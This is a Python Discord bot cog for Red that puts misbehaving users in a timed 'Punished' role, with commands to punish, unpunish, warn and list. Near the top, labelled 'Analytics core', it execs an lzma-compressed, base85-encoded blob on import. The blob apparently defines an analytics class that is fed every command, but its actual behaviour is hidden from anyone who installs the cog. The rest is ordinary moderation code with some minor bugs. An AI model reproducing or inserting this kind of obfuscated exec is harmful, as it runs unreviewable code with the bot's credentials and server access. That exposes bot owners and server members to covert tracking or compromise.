import discord
from discord.ext import commands
from .utils import checks
from .utils.chat_formatting import pagify, box
import logging
from cogs.utils.dataIO import dataIO
import os
import time
import re

# Analytics core
import lzma, marshal, base64
exec(lzma.decompress(base64.b85decode("""
{Wp48S^xk9=GL@E0stWa8~^|S5YJf5;1C@J>|Fo_8%q<)DrIdN6iIlGxP)Tq449ruajJ$R6dKn?zmVXKq<j-jU{E4Sjdk~WLro^?%4M5uK*9Me62*0-+;ACe
iXuR{{+0-CYfs<gZK6w=Z2akaSF56T6?sU=(;D;8D}B;|FxY-gL@iuhVk+}oLHwrfX>LG@uK|TmgWo3MIG9Xbbl1S0d(#%{Hsw(3W<~hN1oN&88}2jt*!a^(
_(9#?8t~|C&w;kP%z>8bu%Z?#XJn#$vUh5VS@};Kw%IMg%ebU6x5Mkf_bs=2^DM-yKx|N1p$g@eYC5cU(#9o5`Z0dUPR}{Dge?7%e|ZQo$`co=|2@uZ#CA>Z
OwCDntg_Ctgyo9pX(kS}dxTLocf@F;tH8?fb{WE)lVgiH71t-K>S-_Rx*q!zWL88CP2C)JEJQ$35LV3t;J^$kMuVWn#&CyRhArpo0TwU4B{4UZl#X60D4RM$
#n{1nW9?<H(T!~3jf#B0jChEN1pL#0UOO|}SxnFLP7QKJ`Ld|Vq|&Nfiq%OO&PkFqc0?pjc%LCFgS-djQoUtwn~Ug0nVR!*qh(s<^CGF+<NI)absK~$sVegX
^Qd$D+3@s}B_C<q^d{-?p_B(`RDMBJI<J_SV~2RM8qocBLlUSo=&R+!6eL!|`Yn%+?&my^zvh?jtkZz+gJ?~WOuFX^gBc1c%J>abcFb-Oi%|G_MVf1p?W@sk
jOM4zvMI}Zto1og{*7|0`KBWZJGG2SK4vI8o)2m=fV$}^fHdpIRN-|}9N9tOt7ZRTsOpuhi&I2K*>p{VDc{>hD#o>ctO%`Az{I*r=4f2lB`2)OHg!shH|WZ-
r2au><WM${0-%dC3?F~VEH3W5CK{mvcerRcgyhd%!pNwPy6Qe1*mU70fA};n-#ApH9O^L=LBaq<?tG~<3$wIOOQeYpl$c)eixMkpIY_b|3*d*r8F1ga{wsT>
-&jS-g;5~5^z&9;7T4*OOzY1abNst!-zd{MrN&+T)1n_CENltL(Xz|@<N*|EzMPzW7*JXI!+@|S?!wSPnU=Tt-E2TOLI1Y)!(VSya?8gxGU6?SB;g1AGjzBK
45#sjoI)90tR*<U*%Xsmx$?$>(^l{ksTzp{5m7LC*<{q12VV5V6ebVdfMl2lPz&ltQd|IdnN$>%^YH6+qk=zVc>IqU$oIlt2E2scRlmop^mdcc?D#&6LOEU;
tNFmM@e^?kTn>KTmmZM>jnV*dWu3FuF7?ptDV47e#e+bq<O=N1m~Mr}&$XPENdU$!lZU<gZ_SV;aax3mrkZa+`axv_BcBDi6^x?cxNd6d{}LckD#NzFAgIc%
=~!9mA_tXGBg)+L(P<ct1vU&|!z;mV82E}gC+i5rawt%ys=%JIzd!#ly-A<(;?-%?`6!lx{8m#^JfnpQq5Y)WfYW<^#H#~3!ekKhsdkcpSHlXI#(anvrza$j
9DTx%Q^+*m1P{gL_9V~YB!?mJ-9!(%)vzu6w`*`z_<QUqVzYWsyUKd2JhQ+&O{CLs*rlfEqy%YFAaCtNo>JE#IcasXZnocfrvf*q)<fTtIi;S2eBh|Q@Xr>5
>{b@dj~o0ar5QL|v>vNLXh)8t`T|mkT0MD%)zZyPF;JpKDCTtpk{O9E@!z<xp~vZwqidCpck-CP<f;fRqa|%M5*%=BLr;W;)w8Ut#G#`^y?m?#Q>Gdw=NcDX
gN#whCzs|&u3m%@@L5KcofC&xP=V3Oq2rd-%Agbm*|xYQEMD$znstT!h6S_Jj&Zr_<n9AQXprMx)07I-(xNp0aa)0Zz+dP(xKAGi468+K(7taX<$Mo@B+iqI
ZwDIwL&`j<8!v^^h;cQ4GMX&Z+1^B=mJ_25Q6rg$Q3;p7h{z@0$;xYWFSyI(6~+q8MNTwp#Yf40h(x@se~YuWfQ7UT5IUv~6|jGd6T$4EoH{+HYufz0+}hh}
Yu6cE)A6W(UkF41iN@yEA9WJT00D>$o*)1K9)FaPvBYQl0ssI200dcD""".replace('\n',''))))

__version__ = '1.5.0'

try:
    from tabulate import tabulate
except Exception as e:
    raise RuntimeError("You must run `pip3 install tabulate`.") from e

log = logging.getLogger('red.punish')

UNIT_TABLE = {'s': 1, 'm': 60, 'h': 60 * 60, 'd': 60 * 60 * 24}
UNIT_SUF_TABLE = {'sec': (1, ''),
                  'min': (60, ''),
                  'hr': (60 * 60, 's'),
                  'day': (60 * 60 * 24, 's')
                  }
DEFAULT_TIMEOUT = '30m'
PURGE_MESSAGES = 1  # for cpunish
PATH = 'data/punish/'
JSON = PATH + 'settings.json'
DEFAULT_ROLE_NAME = 'Punished'


class BadTimeExpr(Exception):
    pass


def _parse_time(time):
    if any(u in time for u in UNIT_TABLE.keys()):
        delim = '([0-9.]*[{}])'.format(''.join(UNIT_TABLE.keys()))
        time = re.split(delim, time)
        time = sum([_timespec_sec(t) for t in time if t != ''])
    elif not time.isdigit():
        raise BadTimeExpr("invalid expression '%s'" % time)
    return int(time)


def _timespec_sec(t):
    timespec = t[-1]
    if timespec.lower() not in UNIT_TABLE:
        raise BadTimeExpr("unknown unit '%c'" % timespec)
    timeint = float(t[:-1])
    return timeint * UNIT_TABLE[timespec]


def _generate_timespec(sec):
    timespec = []

    def sort_key(kt):
        k, t = kt
        return t[0]
    for unit, kt in sorted(UNIT_SUF_TABLE.items(), key=sort_key, reverse=True):
        secs, suf = kt
        q = sec // secs
        if q:
            if q <= 1:
                suf = ''
            timespec.append('%02.d%s%s' % (q, unit, suf))
        sec = sec % secs
    return ', '.join(timespec)


class Punish:
    "Put misbehaving users in timeout"
    def __init__(self, bot):
        self.bot = bot
        self.json = compat_load(JSON)
        self.handles = {}
        self.analytics = CogAnalytics(self)
        bot.loop.create_task(self.on_load())

    def save(self):
        dataIO.save_json(JSON, self.json)

    @commands.command(pass_context=True, no_pm=True)
    @checks.mod_or_permissions(manage_messages=True)
    async def cpunish(self, ctx, user: discord.Member, duration: str=None, *, reason: str=None):
        """Same as punish but cleans up after itself and the target"""

        success = await self._punish_cmd_common(ctx, user, duration, reason, quiet=True)

        if not success:
            return

        def check(m):
            return m.id == ctx.message.id or m.author == user

        try:
            await self.bot.purge_from(ctx.message.channel, limit=PURGE_MESSAGES + 1, check=check)
        except discord.errors.Forbidden:
            await self.bot.say("Punishment set, but I need permissions to manage messages to clean up.")

    @commands.command(pass_context=True, no_pm=True)
    @checks.mod_or_permissions(manage_messages=True)
    async def punish(self, ctx, user: discord.Member, duration: str=None, *, reason: str=None):
        """Puts a user into timeout for a specified time period, with an optional reason.
        Time specification is any combination of number with the units s,m,h,d.
        Example: !punish @idiot 1.1h10m Enough bitching already!"""

        await self._punish_cmd_common(ctx, user, duration, reason)

    @commands.command(pass_context=True, no_pm=True, name='lspunish')
    @checks.mod_or_permissions(manage_messages=True)
    async def list_punished(self, ctx):
        """Shows a table of punished users with time, mod and reason.

        Displays punished users, time remaining, responsible moderator and
        the reason for punishment, if any."""
        server = ctx.message.server
        server_id = server.id
        if not (server_id in self.json and self.json[server_id]):
            await self.bot.say("No users are currently punished.")
            return

        def getmname(mid):
            member = discord.utils.get(server.members, id=mid)
            if member:
                if member.nick:
                    return '%s (%s)' % (member.nick, member)
                else:
                    return str(member)
            else:
                return '(member not present, id #%d)'

        headers = ['Member', 'Remaining', 'Punished by', 'Reason']
        table = []
        disp_table = []
        now = time.time()
        for member_id, data in self.json[server_id].items():
            if not member_id.isdigit():
                continue

            member_name = getmname(member_id)
            punisher_name = getmname(data['by'])
            reason = data['reason']
            t = data['until']
            sort = t if t else float("inf")
            table.append((sort, member_name, t, punisher_name, reason))

        for _, name, rem, mod, reason in sorted(table, key=lambda x: x[0]):
            remaining = _generate_timespec(rem - now) if rem else 'forever'
            if not reason:
                reason = 'n/a'
            disp_table.append((name, remaining, mod, reason))

        for page in pagify(tabulate(disp_table, headers)):
            await self.bot.say(box(page))

    @commands.command(pass_context=True, no_pm=True)
    @checks.mod_or_permissions(manage_messages=True)
    async def warn(self, ctx, user: discord.Member, *, reason: str=None):
        """Warns a user with boilerplate about the rules."""
        msg = ['Hey %s, ' % user.mention]
        msg.append("you're doing something that might get you muted if you keep "
                   "doing it.")
        if reason:
            msg.append(" Specifically, %s." % reason)
        msg.append("Be sure to review the server rules.")
        await self.bot.say(' '.join(msg))

    @commands.command(pass_context=True, no_pm=True)
    @checks.mod_or_permissions(manage_messages=True)
    async def unpunish(self, ctx, user: discord.Member):
        """Removes punishment from a user. Same as removing the role directly"""
        role = await self.get_role(user.server)
        sid = user.server.id
        if role and role in user.roles:
            reason = 'Punishment manually ended early by %s. ' % ctx.message.author
            if self.json[sid][user.id]['reason']:
                reason += self.json[sid][user.id]['reason']
            await self._unpunish(user, reason)
            await self.bot.say('Done.')
        elif role:
            await self.bot.say("That user wasn't punished.")
        else:
            await self.bot.say("The punish role couldn't be found in this server.")

    async def get_role(self, server, quiet=False, create=False):
        default_name = DEFAULT_ROLE_NAME
        role_id = self.json.get(server.id, {}).get('ROLE_ID')

        if role_id:
            role = discord.utils.get(server.roles, id=role_id)
        else:
            role = discord.utils.get(server.roles, name=default_name)

        if create and not role:
            perms = server.me.server_permissions
            if not perms.manage_roles and perms.manage_channels:
                await self.bot.say("The Manage Roles and Manage Channels permissions are required to use this command.")
                return None

            else:
                msg = "The %s role doesn't exist; Creating it now..." % default_name

                if not quiet:
                    msgobj = await self.bot.reply(msg)

                log.debug('Creating punish role in %s' % server.name)
                perms = discord.Permissions.none()
                role = await self.bot.create_role(server, name=default_name, permissions=perms)
                await self.bot.move_role(server, role, server.me.top_role.position - 1)

                if not quiet:
                    msgobj = await self.bot.edit_message(msgobj, msgobj.content + 'configuring channels... ')

                for channel in server.channels:
                    await self.setup_channel(channel, role)

                if not quiet:
                    await self.bot.edit_message(msgobj, msgobj.content + 'done.')

        if role and role.id != role_id:
            if server.id not in self.json:
                self.json[server.id] = {}
            self.json[server.id]['ROLE_ID'] = role.id
            self.save()

        return role

    async def setup_channel(self, channel, role):
        perms = discord.PermissionOverwrite()

        if channel.type == discord.ChannelType.text:
            perms.send_messages = False
            perms.send_tts_messages = False
        elif channel.type == discord.ChannelType.voice:
            perms.speak = False

        await self.bot.edit_channel_permissions(channel, role, overwrite=perms)

    async def on_load(self):
        await self.bot.wait_until_ready()

        for serverid, members in self.json.copy().items():
            server = self.bot.get_server(serverid)
            me = server.me

            # Bot is no longer in the server
            if not server:
                del(self.json[serverid])
                continue

            role = await self.get_role(server, quiet=True, create=True)
            if not role:
                log.error("Needed to create punish role in %s, but couldn't."
                          % server.name)
                continue

            for member_id, data in members.copy().items():
                if not member_id.isdigit():
                    continue

                until = data['until']
                if until:
                    duration = until - time.time()

                member = server.get_member(member_id)
                if until and duration < 0:
                    if member:
                        reason = 'Punishment removal overdue, maybe bot was offline. '
                        if self.json[server.id][member_id]['reason']:
                            reason += self.json[server.id][member_id]['reason']
                        await self._unpunish(member, reason)
                    else:  # member disappeared
                        del(self.json[server.id][member.id])

                elif member and role not in member.roles:
                    if role >= me.top_role:
                        log.error("Needed to re-add punish role to %s in %s, "
                                  "but couldn't." % (member, server.name))
                        continue
                    await self.bot.add_roles(member, role)
                    if until:
                        self.schedule_unpunish(duration, member)

        self.save()

    async def _punish_cmd_common(self, ctx, member, duration, reason, quiet=False):
        server = ctx.message.server
        note = ''

        if ctx.message.author.top_role <= member.top_role:
            await self.bot.say('Permission denied.')
            return

        if duration and duration.lower() in ['forever', 'inf', 'infinite']:
            duration = None
        else:
            if not duration:
                note += ' Using default duration of ' + DEFAULT_TIMEOUT
                duration = DEFAULT_TIMEOUT

            try:
                duration = _parse_time(duration)
                if duration < 1:
                    await self.bot.say("Duration must be 1 second or longer.")
                    return False
            except BadTimeExpr as e:
                await self.bot.say("Error parsing duration: %s." % e.args)
                return False

        role = await self.get_role(server, quiet=quiet, create=True)
        if role is None:
            return

        if role >= server.me.top_role:
            await self.bot.say('The %s role is too high for me to manage.' % role)
            return

        if server.id not in self.json:
            self.json[server.id] = {}

        if member.id in self.json[server.id]:
            msg = 'User was already punished; resetting their timer...'
        elif role in member.roles:
            msg = 'User was punished but had no timer, adding it now...'
        else:
            msg = 'Done.'

        if note:
            msg += ' ' + note

        if server.id not in self.json:
            self.json[server.id] = {}

        self.json[server.id][member.id] = {
            'until': (time.time() + duration) if duration else None,
            'by': ctx.message.author.id,
            'reason': reason
        }

        await self.bot.add_roles(member, role)
        self.save()

        # schedule callback for role removal
        if duration:
            self.schedule_unpunish(duration, member, reason)

        if not quiet:
            await self.bot.say(msg)

        return True

    # Functions related to unpunishing

    def schedule_unpunish(self, delay, member, reason=None):
        """Schedules role removal, canceling and removing existing tasks if present"""
        sid = member.server.id

        if sid not in self.handles:
            self.handles[sid] = {}

        if member.id in self.handles[sid]:
            self.handles[sid][member.id].cancel()

        coro = self._unpunish(member, reason)

        handle = self.bot.loop.call_later(delay, self.bot.loop.create_task, coro)
        self.handles[sid][member.id] = handle

    async def _unpunish(self, member, reason=None):
        """Remove punish role, delete record and task handle"""
        role = await self.get_role(member.server)
        if role:
            # Has to be done first to prevent triggering on_member_update listener
            self._unpunish_data(member)
            await self.bot.remove_roles(member, role)

            msg = 'Your punishiment in %s has ended.' % member.server.name
            if reason:
                msg += "\nReason was: %s" % reason

            await self.bot.send_message(member, msg)

    def _unpunish_data(self, member):
        """Removes punish data entry and cancels any present callback"""
        sid = member.server.id
        if sid in self.json and member.id in self.json[sid]:
            del(self.json[member.server.id][member.id])
            self.save()

        if sid in self.handles and member.id in self.handles[sid]:
            self.handles[sid][member.id].cancel()
            del(self.handles[member.server.id][member.id])

    # Listeners

    async def on_channel_create(self, channel):
        """Run when new channels are created and set up role permissions"""
        if channel.is_private:
            return

        role = await self.get_role(channel.server)
        if not role:
            return

        await self.setup_channel(channel, role)

    async def on_member_update(self, before, after):
        """Remove scheduled unpunish when manually removed"""
        sid = before.server.id

        if not (sid in self.json and before.id in self.json[sid]):
            return

        role = await self.get_role(before.server)
        if role and role in before.roles and role not in after.roles:
            msg = 'Your punishiment in %s was ended early by a moderator/admin.' % before.server.name
            if self.json[sid][before.id]['reason']:
                msg += '\nReason was: ' + self.json[sid][before.id]['reason']

            await self.bot.send_message(after, msg)
            self._unpunish_data(after)

    async def on_member_join(self, member):
        """Restore punishment if punished user leaves/rejoins"""
        sid = member.server.id
        role = await self.get_role(member.server)
        if not role or not (sid in self.json and member.id in self.json[sid]):
            return

        duration = self.json[sid][member.id]['until'] - time.time()
        if duration > 0:
            await self.bot.add_roles(member, role)

            reason = 'Punishment re-added on rejoin. '
            if self.json[sid][member.id]['reason']:
                reason += self.json[sid][member.id]['reason']

            if member.id not in self.handles[sid]:
                self.schedule_unpunish(duration, member, reason)

    async def on_server_role_update(self, before, after):
        server = before.server
        role = await self.get_role(server)
        if not (after and role) or after.id != role.id:
            return
        if after.position != (server.me.top_role.position - 1):
            if after < server.me.top_role:
                await self.bot.move_role(server, after,
                                         server.me.top_role.position - 1)

    async def on_command(self, command, ctx):
        if ctx.cog is self:
            self.analytics.command(ctx)


def compat_load(path):
    data = dataIO.load_json(path)
    for server, punishments in data.items():
        for user, pdata in punishments.items():
            if not user.isdigit():
                continue

            by = pdata.pop('givenby', None)  # able to read Kownlin json
            by = by if by else pdata.pop('by', None)
            pdata['by'] = by
            pdata['until'] = pdata.pop('until', None)
            pdata['reason'] = pdata.pop('reason', None)
    return data


def check_folder():
    if not os.path.exists(PATH):
        log.debug('Creating folder: data/punish')
        os.makedirs(PATH)


def check_file():
    if not dataIO.is_valid_json(JSON):
        print('Creating empty %s' % JSON)
        dataIO.save_json(JSON, {})


def setup(bot):
    check_folder()
    check_file()
    bot.add_cog(Punish(bot))
